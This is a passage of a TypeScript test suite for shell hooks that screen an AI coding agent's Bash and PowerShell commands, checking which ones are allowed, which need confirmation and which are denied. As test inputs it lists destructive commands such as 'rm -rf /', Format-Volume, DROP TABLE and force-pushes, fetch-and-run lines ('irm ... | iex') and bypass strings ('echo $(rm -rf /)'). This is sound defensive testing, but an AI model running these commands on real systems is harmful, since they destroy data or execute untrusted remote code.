      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('docker system prune -a'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Docker');
    });
  });

  // --- Safe commands ---

  describe('safe commands allow without warning', () => {
    const safeCmds = [
      'ls -la',
      'git status',
      'npm install',
      'cat README.md',
      'echo hello',
    ];

    for (const cmd of safeCmds) {
      test(`"${cmd}" allows`, () => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(cmd));
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
      });
    }
  });

  // --- Edge cases ---

  describe('edge cases', () => {
    test('empty command allows gracefully', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(''));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    test('missing command field allows gracefully', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, { tool_input: {} });
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
    });

    test('malformed JSON input fails CLOSED (asks instead of allowing)', () => {
      // Pre-#2426 this allowed (`{}`) — a hook that gates destructive commands
      // must not allow-by-default on input it cannot read.
      const { exitCode, output } = runHookRaw(CAREFUL_SCRIPT, 'this is not json at all{{{{');
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('parse');
    });

    test('Python fallback: grep fails on multiline JSON, Python parses it', () => {
      // Construct JSON where "command": and the value are on separate lines.
      // grep works line-by-line, so it cannot match "command"..."value" across lines.
      // This forces CMD to be empty, triggering the Python fallback which handles
      // the full JSON correctly.
      const rawJson = '{"tool_input":{"command":\n"rm -rf /tmp/important"}}';
      const { exitCode, output } = runHookRaw(CAREFUL_SCRIPT, rawJson);
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    });
  });

  // --- HIGH tier (hard deny) ---
  // A tiny set of catastrophic SIMPLE commands is denied outright while
  // /careful is active. Best-effort advisory hard-stop, not a policy boundary:
  // compound commands always fall through to the MEDIUM ask.

  describe('HIGH tier (hard deny)', () => {
    test.each(['rm -rf /', 'rm -rf ~', 'rm -rf $HOME', 'sudo rm -rf /', 'rm -Rf ~/'])(
      'denies catastrophic recursive delete: %s',
      (command) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('HIGH');
      },
    );

    test('rm -rf ~/subdir stays MEDIUM ask (not the whole home dir)', () => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf ~/subdir'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
    });

    test('git push --force origin <default branch> denies', () => {
      withGitRepo('main', 'feature', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push --force origin main'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('default branch');
      });
    });

    test('bare git push --force while ON the default branch denies', () => {
      withGitRepo('main', 'main', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push --force'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('HIGH');
      });
    });

    test('bare git push --force on a feature branch asks (MEDIUM)', () => {
      withGitRepo('main', 'feature', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push --force'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('force-push');
      });
    });

    test('git push -f origin feature asks (MEDIUM — not the default branch)', () => {
      withGitRepo('main', 'main', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push -f origin feature'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('force-push');
      });
    });

    test('compound force-push falls through to ask, never deny (cannot resolve cwd)', () => {
      withGitRepo('main', 'main', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('cd elsewhere && git push --force origin main'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
      });
    });

    test.each(['rm -rf --no-preserve-root /', 'rm -rf / --no-preserve-root', 'rm -rf /*'])(
      'denies catastrophic rm variant: %s',
      (command) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('HIGH');
      },
    );

    test('plus-refspec force to the default branch denies (git push origin +main)', () => {
      withGitRepo('main', 'feature', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push origin +main'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('HIGH');
      });
    });

    test('refspec-form force to the default branch denies (git push -f origin HEAD:main)', () => {
      withGitRepo('main', 'feature', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push -f origin HEAD:main'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      });
    });

    test('plus-refspec force to a FEATURE branch asks (MEDIUM, not silent allow)', () => {
      withGitRepo('main', 'main', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push origin +feature'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('force-push');
      });
    });

    test('slashed default branch is matched whole (git push -f origin release/2.0)', () => {
      withGitRepo('release/2.0', 'feature', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push -f origin release/2.0'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('release/2.0');
      });
    });

    test.each(['rm -rf "/"', "rm -rf '~'", 'rm -rf //'])('quoted root targets still deny: %s', (command) => {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput(command));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
    });

    test('quoted default-branch ref still denies (git push -f origin "main")', () => {
      withGitRepo('main', 'feature', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push -f origin "main"'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      });
    });

    test('missing origin/HEAD symbolic ref falls back to origin/main probe (Conductor worktrees)', () => {
      const repoDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-careful-nohead-'));
      try {
        const git = (args: string[]) => gitArgvIn(repoDir, args);
        git(['init', '-q', '-b', 'main']);
        git(['commit', '--allow-empty', '-q', '-m', 'init']);
        // No symbolic-ref — only a plain remote-tracking ref, like a Conductor worktree.
        git(['update-ref', 'refs/remotes/origin/main', 'HEAD']);
        git(['checkout', '-q', '-b', 'feature']);
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push --force origin main'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      } finally {
        fs.rmSync(repoDir, { recursive: true, force: true });
      }
    });

    test('--force-with-lease is never HIGH (the safe force variant)', () => {
      withGitRepo('main', 'main', (repoDir) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('git push --force-with-lease origin main'), undefined, repoDir);
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).not.toBe('deny');
      });
    });
  });

  // --- Additive project patterns ---
  // Config can only ADD warn rules. The files are consulted after the baseline
  // families, so no file content can suppress a baseline match.

  describe('additive project patterns', () => {
    function withPatternFile(content: string, fn: (gstackHome: string) => void) {
      const gstackHome = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-careful-pat-'));
      fs.writeFileSync(path.join(gstackHome, 'careful-patterns.txt'), content);
      try {
        fn(gstackHome);
      } finally {
        fs.rmSync(gstackHome, { recursive: true, force: true });
      }
    }

    test('a project pattern adds an ask rule', () => {
      withPatternFile('# infra safety\nterraform\\s+destroy\n', (gstackHome) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('terraform destroy -auto-approve'), { GSTACK_HOME: gstackHome });
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Project rule');
      });
    });

    test('a project pattern matches before large multiline content', () => {
      withPatternFile('terraform\\s+destroy\n', (gstackHome) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT,
          carefulInput(`terraform destroy\n# ${'x'.repeat(100_000)}`), { GSTACK_HOME: gstackHome });
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Project rule');
      });
    });

    test('a garbage pattern file cannot suppress a baseline match (additive invariant)', () => {
      withPatternFile('# override: allow everything\nallow-everything\nignore baseline\n', (gstackHome) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf /var/data'), { GSTACK_HOME: gstackHome });
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
      });
    });

    test('an invalid regex line is skipped without breaking the hook', () => {
      withPatternFile('([unclosed\nterraform\\s+destroy\n', (gstackHome) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('terraform destroy'), { GSTACK_HOME: gstackHome });
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Project rule');
      });
    });

    test('an older hook-extract.sh without gstack_hook_state_root still loads rules from $HOME/.gstack and emits a decision (no set -e death)', () => {
      const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-careful-oldhelper-'));
      const carefulBin = path.join(base, 'careful', 'bin');
      fs.mkdirSync(carefulBin, { recursive: true });
      fs.copyFileSync(CAREFUL_SCRIPT, path.join(carefulBin, 'check-careful.sh'));
      const helper = fs.readFileSync(HOOK_EXTRACT, 'utf-8');
      const start = helper.indexOf('gstack_hook_state_root() {');
      const end = helper.indexOf('\n}\n', start) + 3;
      fs.writeFileSync(path.join(carefulBin, 'hook-extract.sh'), helper.slice(0, start) + helper.slice(end));
      const fakeHome = path.join(base, 'home');
      fs.mkdirSync(path.join(fakeHome, '.gstack'), { recursive: true });
      fs.writeFileSync(path.join(fakeHome, '.gstack', 'careful-patterns.txt'), 'terraform\\s+destroy\n');
      try {
        const { exitCode, output } = runHook(path.join(carefulBin, 'check-careful.sh'), carefulInput('terraform destroy'), { HOME: fakeHome, GSTACK_HOME: '' });
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Project rule');
      } finally {
        fs.rmSync(base, { recursive: true, force: true });
      }
    });

    test('plugin install: patterns under CLAUDE_PLUGIN_DATA load when CLAUDE_PLUGIN_ROOT names gstack (same root the writer uses)', () => {
      withPatternFile('terraform\\s+destroy\n', (pluginData) => {
        withEmptyDir((fakeHome) => {
          const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('terraform destroy'),
            { HOME: fakeHome, GSTACK_HOME: '', CLAUDE_PLUGIN_DATA: pluginData, CLAUDE_PLUGIN_ROOT: '/plugins/gstack' });
          expect(exitCode).toBe(0);
          expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
          expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Project rule');
        });
      });
    });

    test('GSTACK_HOME outranks CLAUDE_PLUGIN_DATA for careful patterns, exactly as for the freeze file', () => {
      withPatternFile('terraform\\s+destroy\n', (gstackHome) => {
        withEmptyDir((pluginData) => {
          const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('terraform destroy'),
            { GSTACK_HOME: gstackHome, CLAUDE_PLUGIN_DATA: pluginData, CLAUDE_PLUGIN_ROOT: '/plugins/gstack' });
          expect(exitCode).toBe(0);
          expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
          expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('Project rule');
        });
      });
    });

    test('safe commands still allow with a pattern file present', () => {
      withPatternFile('terraform\\s+destroy\n', (gstackHome) => {
        const { exitCode, output } = runHook(CAREFUL_SCRIPT, carefulInput('ls -la'), { GSTACK_HOME: gstackHome });
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
      });
    });
  });
});

// ============================================================
// check-careful.sh on the PowerShell tool and nested shells (#3067)
// ============================================================
// Payload shape: Claude Code's PowerShell tool sends tool_input.command, the
// same fields as Bash, with tool_name "PowerShell" (hooks reference,
// code.claude.com/docs/en/hooks#powershell; tools reference "PowerShell tool").
function psInput(command: string) {
  return { tool_name: 'PowerShell', tool_input: { command } };
}

function bashInput(command: string) {
  return { tool_name: 'Bash', tool_input: { command } };
}

function carefulDecision(input: object): { decision: string | undefined; reason: string } {
  const { exitCode, output } = runHook(CAREFUL_SCRIPT, input);
  expect(exitCode).toBe(0);
  return {
    decision: output.hookSpecificOutput?.permissionDecision,
    reason: output.hookSpecificOutput?.permissionDecisionReason ?? '',
  };
}

describe('check-careful.sh PowerShell and cmd coverage (#3067)', () => {
  describe('Remove-Item alias families ask (case-insensitive, any parameter prefix)', () => {
    test.each([
      ['Remove-Item -Recurse -Force C:\\proj'],
      ['remove-item -rec C:\\proj'],
      ['REMOVE-ITEM x -Recurse:$true'],
      ['rm -r -fo C:\\proj'],
      ['ri -Recurse x'],
      ['del -Forc x'],
      ['erase -recurse x'],
      ['rd -r x'],
      ['rmdir -Force x'],
      ['Remove-Item -LiteralPath @("C:\\a", "C:\\b") -Recurse -Force'],
      ['Get-ChildItem build | ri -r -fo'],
      ['Write-Output start; Remove-Item -Recurse x'],
      ['Re`move-Item -Recurse x'],
    ])('%s asks and names ps_remove_item', (cmd) => {
      const { decision, reason } = carefulDecision(psInput(cmd));
      expect(decision).toBe('ask');
      expect(reason).toContain('Remove-Item');
      expect(reason).toContain('pattern: ps_remove_item');
    });
  });

  describe('cmd switches ask', () => {
    test.each([
      ['rmdir /s /q C:\\proj', 'cmd_rd_s'],
      ['cmd /c rd /s /q C:\\proj', 'cmd_rd_s'],
      ['cmd /c "rd /s/q C:\\proj"', 'cmd_rd_s'],
      ['cmd /c r^d /s /q C:\\proj', 'cmd_rd_s'],
      ['cmd /c del /s /q *.log', 'cmd_del_s'],
      ['cmd /c erase /q /s *.tmp', 'cmd_del_s'],
    ])('%s asks (%s)', (cmd, pattern) => {
      const { decision, reason } = carefulDecision(psInput(cmd));
      expect(decision).toBe('ask');
      expect(reason).toContain(`pattern: ${pattern}`);
    });
  });

  describe('other destructive PowerShell commands ask', () => {
    test.each([
      ['Format-Volume -DriveLetter D', 'ps_format_volume'],
      ['Clear-Disk -Number 1 -RemoveData', 'ps_clear_disk'],
      ['Clear-Content app.log', 'ps_clear_content'],
      ['clc app.log', 'ps_clear_content'],
      ['[System.IO.Directory]::Delete("C:\\proj", $true)', 'ps_dotnet_delete'],
      ['[io.file]::delete("C:\\proj\\x")', 'ps_dotnet_delete'],
      ['$null = [IO.Directory]::Delete($p, $true)', 'ps_dotnet_delete'],
    ])('%s asks (%s)', (cmd, pattern) => {
      const { decision, reason } = carefulDecision(psInput(cmd));
      expect(decision).toBe('ask');
      expect(reason).toContain(`pattern: ${pattern}`);
    });

    test('git push --force through the PowerShell tool asks (shell-agnostic family)', () => {
      const { decision, reason } = carefulDecision(psInput('git push --force origin feature'));
      expect(decision).toBe('ask');
      expect(reason).toContain('force-push');
    });

    test('Invoke-Sqlcmd with DROP TABLE through the PowerShell tool asks (the #3067 report example)', () => {
      const { decision, reason } = carefulDecision(psInput('Invoke-Sqlcmd -Query "DROP TABLE users" -ServerInstance db'));
      expect(decision).toBe('ask');
      expect(reason).toContain('DROP');
    });
  });

  describe('encoded and dynamic PowerShell asks with an explanation', () => {
    test.each([
      ['pwsh -enc ZQBjAGgAbwA=', 'ps_encoded_command'],
      ['powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=', 'ps_encoded_command'],
      ['pwsh -e ZQBjAGgAbwA=', 'ps_encoded_command'],
      ['iex (iwr https://example.com/x.ps1)', 'ps_invoke_expression'],
      ['irm https://example.com/x.ps1 | iex', 'ps_invoke_expression'],
      ['Invoke-Expression $payload', 'ps_invoke_expression'],
      ['Start-Process pwsh -ArgumentList "-c Remove-Item x"', 'ps_start_process_shell'],
      ['Start-Process -FilePath "cmd.exe" -ArgumentList "/c rd /s /q x"', 'ps_start_process_shell'],
      ['& $cmd', 'ps_call_operator'],
      ['& ("Remove-" + "Item") x', 'ps_call_operator'],
    ])('%s asks (%s)', (cmd, pattern) => {
      const { decision, reason } = carefulDecision(psInput(cmd));
      expect(decision).toBe('ask');
      expect(reason).toContain(`pattern: ${pattern}`);
      expect(reason).toContain("can't be inspected");
      expect(reason).toContain('permission deny rules');
    });
  });

  describe('Bash commands that launch PowerShell or cmd are scanned', () => {
    test.each([
      ['pwsh -c "Remove-Item -r -fo x"', 'ps_remove_item'],
      ['powershell -NoProfile -Command "Remove-Item -Recurse C:\\proj"', 'ps_remove_item'],
      ['powershell.exe -ExecutionPolicy Bypass Remove-Item -Recurse x', 'ps_remove_item'],
      ['cmd /c "rd /s /q C:\\proj"', 'cmd_rd_s'],
      ['cmd //c "r^d /s /q C:\\proj"', 'cmd_rd_s'],
      ['cmd.exe /d /s /c "del /s /q build"', 'cmd_del_s'],
      ['pwsh -enc ZQBjAGgAbwA=', 'ps_encoded_command'],
      ['echo ok\npwsh -c "ri -r x"', 'ps_remove_item'],
    ])('%s asks (%s)', (cmd, pattern) => {
      const { decision, reason } = carefulDecision(bashInput(cmd));
      expect(decision).toBe('ask');
      expect(reason).toContain(`pattern: ${pattern}`);
    });
  });

  describe('negative controls stay allowed on both tools', () => {
    const controls = [
      'git branch -d feature',
      'ord',
      'ls --del',
      'ls /rd/x',
      'cat ./src/rd/notes.txt',
      'Get-ChildItem -Recurse',
      'Remove-Item x.txt',
      'Remove-Item -Filter *.tmp x',
      'del x.txt',
      'go test ./cmd/...',
      'pwsh -v',
      'pwsh -ExecutionPolicy Bypass -File build.ps1',
      'cmd /c dir',
      'grep -e foo x',
      'Start-Process notepad',
      'git status && git log --oneline -3',
    ];
    for (const tool of ['Bash', 'PowerShell']) {
      test.each(controls)(`${tool}: %s allows`, (cmd) => {
        const { decision } = carefulDecision({ tool_name: tool, tool_input: { command: cmd } });
        expect(decision).toBeUndefined();
      });
    }
  });

  describe('PR #1110 bypass strings stay caught (negative controls for an echo/commit skip)', () => {
    test.each([
      ['echo hi; rm -rf ~'],
      ['echo $(rm -rf /)'],
      ['git commit -m "$(rm -rf ~)"'],
    ])('%s asks', (cmd) => {
      expect(carefulDecision(bashInput(cmd)).decision).toBe('ask');
      expect(carefulDecision(carefulInput(cmd)).decision).toBe('ask');
    });
  });

  test('a malformed PowerShell payload fails closed (ask, exit 0)', () => {
    const { exitCode, output } = runHookRaw(CAREFUL_SCRIPT, '{"tool_name":"PowerShell","tool_input":{"command":"Remove-Item');
    expect(exitCode).toBe(0);
    expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
  });

  test('Windows text-mode Python output (\\n written as \\r\\n) still dispatches on tool_name', () => {
    // windows-free-tests run 37739845723: python3's text-mode stdout turned
    // "PowerShell\n" into "PowerShell\r\n", so the PowerShell table never ran.
    // A sitecustomize that rewraps stdout with newline='\r\n' reproduces it.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-careful-crlf-'));
    fs.writeFileSync(path.join(dir, 'sitecustomize.py'),
      "import io, sys\nsys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', newline='\\r\\n')\n");
    try {
      const { exitCode, output } = runHook(CAREFUL_SCRIPT, psInput('Remove-Item -Recurse x'), { PYTHONPATH: dir });
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('pattern: ps_remove_item');
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a payload without tool_name is checked as Bash, exactly as before', () => {
    expect(carefulDecision(carefulInput('rm -rf /var/data')).decision).toBe('ask');
    expect(carefulDecision(carefulInput('Remove-Item -Recurse x')).decision).toBeUndefined();
  });

  test('an older hook-extract.sh without gstack_hook_extract_tool still checks the command', () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-careful-oldextract-'));
    const carefulBin = path.join(base, 'careful', 'bin');
    fs.mkdirSync(carefulBin, { recursive: true });
    fs.copyFileSync(CAREFUL_SCRIPT, path.join(carefulBin, 'check-careful.sh'));
    const helper = fs.readFileSync(HOOK_EXTRACT, 'utf-8');
    const start = helper.indexOf('gstack_hook_extract_tool() {');
    const end = helper.indexOf('\n}\n', start) + 3;
    expect(start).toBeGreaterThan(0);
    fs.writeFileSync(path.join(carefulBin, 'hook-extract.sh'), helper.slice(0, start) + helper.slice(end));
    try {
      const { exitCode, output } = runHook(path.join(carefulBin, 'check-careful.sh'), bashInput('rm -rf /var/data'));
      expect(exitCode).toBe(0);
      expect(output.hookSpecificOutput?.permissionDecision).toBe('ask');
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });
});

// ============================================================
// check-freeze.sh tests
// ============================================================
// The freeze fix (#3623) made the shared extractor keep trailing newlines and
// map lone surrogates on PATH fields only; a command must come out exactly as
// before, on both extractor branches.
describe('shared extractor keeps /careful command values unchanged (#3623)', () => {
  test.skipIf(process.platform === 'win32').each(['python3', 'node'])('with %s failing, a command still drops trailing newlines and nothing else', (broken) => {
    const shim = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-extract-shim-'));
    try {
      fs.writeFileSync(path.join(shim, broken), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
      const env = { ...process.env, PATH: shim + path.delimiter + (process.env.PATH ?? '') };
      const payload = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'rm -rf /var/data  \n# note\n\n\n' } });
      const r = spawnSync('bash', ['-c', '. "$1" && gstack_hook_extract_tool "$2" command && printf "%s|%s|%s" "$GSTACK_HOOK_TOOL" "$GSTACK_HOOK_FIELD" "$GSTACK_HOOK_VALUE"', 'x', HOOK_EXTRACT, payload], { env, encoding: 'utf-8', timeout: 5000 });
      expect(r.status).toBe(0);
      expect(r.stdout).toBe('Bash|command|rm -rf /var/data  \n# note');

      const hook = runHook(CAREFUL_SCRIPT, carefulInput('rm -rf /var/data\n\n'), { PATH: env.PATH });
      expect(hook.output.hookSpecificOutput?.permissionDecision).toBe('ask');
      expect(hook.output.hookSpecificOutput?.permissionDecisionReason).toContain('recursive delete');
    } finally {
      fs.rmSync(shim, { recursive: true, force: true });
    }
  });
});

describe('check-freeze.sh', () => {

  describe('edits inside freeze boundary', () => {
    test('edit inside freeze boundary allows', () => {
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output } = runHook(
          FREEZE_SCRIPT,
          freezeInput('/Users/dev/project/src/index.ts'),
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
      });
    });

    test('edit in subdirectory of freeze path allows', () => {
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output } = runHook(
          FREEZE_SCRIPT,
          freezeInput('/Users/dev/project/src/components/Button.tsx'),
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
      });
    });
  });

  describe('edits outside freeze boundary', () => {
    test('edit outside freeze boundary denies', () => {
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output } = runHook(
          FREEZE_SCRIPT,
          freezeInput('/Users/dev/other-project/index.ts'),
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('freeze');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('outside');
      });
    });

    test('write outside freeze boundary denies', () => {
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output } = runHook(
          FREEZE_SCRIPT,
          freezeInput('/etc/hosts'),
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('freeze');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('outside');
      });
    });
  });

  describe('trailing slash prevents prefix confusion', () => {
    test('freeze at /src/ denies /src-old/ (trailing slash prevents prefix match)', () => {
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output } = runHook(
          FREEZE_SCRIPT,
          freezeInput('/Users/dev/project/src-old/index.ts'),
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('outside');
      });
    });
  });

  describe('no freeze file exists', () => {
    test('allows everything when no freeze file present', () => {
      const stateDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-test-'));
      try {
        const { exitCode, output } = runHook(
          FREEZE_SCRIPT,
          freezeInput('/anywhere/at/all.ts'),
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
      } finally {
        fs.rmSync(stateDir, { recursive: true, force: true });
      }
    });
  });

  describe('edge cases', () => {
    test('missing file_path field allows gracefully', () => {
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output } = runHook(
          FREEZE_SCRIPT,
          { tool_input: {} },
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBeUndefined();
      });
    });

    test('malformed JSON payload DENIES (fail closed — freeze is a deny-tier hook)', () => {
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output } = runHookRaw(
          FREEZE_SCRIPT,
          'not json at all {{{{',
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
        expect(output.hookSpecificOutput?.permissionDecisionReason).toContain('fail closed');
      });
    });

    test('a quote-bearing path outside the boundary emits PARSEABLE deny JSON', () => {
      // The old printf-interpolated deny emitted malformed JSON for paths
      // containing quotes — Claude Code silently ignored the whole decision,
      // so the deny no-oped exactly when the path was hostile.
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output, raw } = runHook(
          FREEZE_SCRIPT,
          freezeInput('/tmp/evil"quoted/x.ts'),
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(() => JSON.parse(raw)).not.toThrow();
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      });
    });

    test('a newline-bearing path outside the boundary emits PARSEABLE deny JSON', () => {
      withFreezeDir('/Users/dev/project/src/', (stateDir) => {
        const { exitCode, output, raw } = runHook(
          FREEZE_SCRIPT,
          freezeInput('/tmp/evil\npath.ts'),
          freezeEnv(stateDir),
        );
        expect(exitCode).toBe(0);
        expect(() => JSON.parse(raw)).not.toThrow();
        expect(output.hookSpecificOutput?.permissionDecision).toBe('deny');
      });
    });
  });

  describe('space-bearing freeze boundary', () => {
    // The old `tr -d '[:space:]'` stripped INTERNAL spaces from the freeze
    // path, so a boundary like ".../My Project/src" never matched anything.
    test('a boundary containing spaces allows edits inside it', () => {
      const base = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-freeze-space-'));
      const boundary = path.join(base, 'My Project', 'src');
      fs.mkdirSync(boundary, { recursive: true });
      try {
        withFreezeDir(boundary + '/', (stateDir) => {
          const inside = runHook(FREEZE_SCRIPT, freezeInput(path.join(boundary, 'index.ts')), freezeEnv(stateDir));
          expect(inside.exitCode).toBe(0);
          expect(inside.output.hookSpecificOutput?.permissionDecision).toBeUndefined();

          const outside = runHook(FREEZE_SCRIPT, freezeInput(path.join(base, 'elsewhere.ts')), freezeEnv(stateDir));
          expect(outside.exitCode).toBe(0);
          expect(outside.output.hookSpecificOutput?.permissionDecision).toBe('deny');
        });
      } finally {
        fs.rmSync(base, { recursive: true, force: true });
      }
    });
  });

